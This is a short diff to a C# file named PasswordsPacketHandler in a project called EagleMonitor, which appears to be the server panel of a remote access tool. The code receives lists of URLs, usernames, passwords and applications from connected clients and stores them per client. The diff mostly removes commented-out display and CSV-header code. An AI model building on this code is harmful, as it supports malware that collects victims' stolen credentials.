@@ -16,23 +16,8 @@ namespace EagleMonitor.PacketParser
     {
         public PasswordsPacketHandler(PasswordsPacket passwordsPacket, ClientHandler clientHandler)
         {
-            /*clientHandler.passwordsForm.dataGridView1.Invoke((MethodInvoker)(() =>
-            {
-                clientHandler.passwordsForm.dataGridView1.Rows.Clear();
-                foreach (object[] str in packet.passwordsList)
-                {
-                    int rowId = clientHandler.passwordsForm.dataGridView1.Rows.Add();
-                    DataGridViewRow row = clientHandler.passwordsForm.dataGridView1.Rows[rowId];
-                    row.Cells["Column1"].Value = str[0].ToString();
-                    row.Cells["Column2"].Value = str[1].ToString();
-                    row.Cells["Column3"].Value = str[2].ToString();
-                    row.Cells["Column4"].Value = str[3].ToString();
-                }
-            }));*/
             new Thread(() =>
             {
-                if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\Passwords\\"))
-                    System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\Passwords");
                 if (passwordsPacket.passwordsList != null)
                 {
                     try
@@ -67,7 +52,3 @@ namespace EagleMonitor.PacketParser
         }
     }
 }
-// sw.Write(string.Format("{0};", "URL"));
-// sw.Write(string.Format("{0};", "Username"));
-// sw.Write(string.Format("{0};", "Password"));
-// sw.Write(string.Format("{0};", "Application"));
